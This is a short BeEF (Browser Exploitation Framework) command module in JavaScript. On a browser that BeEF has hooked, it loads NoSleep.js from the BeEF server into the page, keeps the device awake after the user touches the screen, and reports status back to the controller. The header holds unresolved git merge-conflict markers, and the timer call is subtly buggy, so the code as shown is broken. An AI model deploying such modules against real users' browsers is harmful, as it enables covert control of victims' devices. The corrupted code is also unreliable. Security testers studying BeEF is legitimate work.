//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  enableNoSleep = function() {
    var noSleep = new NoSleep();
    noSleep.enable();
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=NoSleep initiated');
    document.removeEventListener('touchstart', enableNoSleep, false);
  }

  init = function() {
    document.addEventListener('touchstart', enableNoSleep, false);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=waiting for user input');
  }

  if (typeof NoSleep == "undefined") {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/NoSleep.js';
    $j("body").append(script);
    setTimeout(init(), 5000);
  }

});

